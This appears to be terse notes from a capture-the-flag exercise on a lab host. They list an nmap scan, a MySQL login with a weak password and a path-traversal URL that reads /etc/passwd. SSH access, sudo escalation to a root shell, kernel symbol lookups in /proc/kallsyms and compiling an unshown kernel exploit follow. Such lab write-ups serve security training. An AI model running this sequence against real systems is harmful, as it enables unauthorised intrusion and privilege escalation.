# Nwk-ctf
Netwokr web and kernel ip:1.0.1.0.1
nmap -A 1.0.1.0.1

ftp 1.0.1.0.1

mysql -u admin -p123456 -h 1.0.1.0.1

http://1.0.1.0.1/index.php?page=../../../../etc/passwd

ssh ali@1.0.1.0.1

sudo -l

sudo bash

cat /proc/kallsyms | grep prepare_kernel_cred

cat /proc/kallsyms | grep commit_creds

gcc exploit.c -o exploit

./exploit
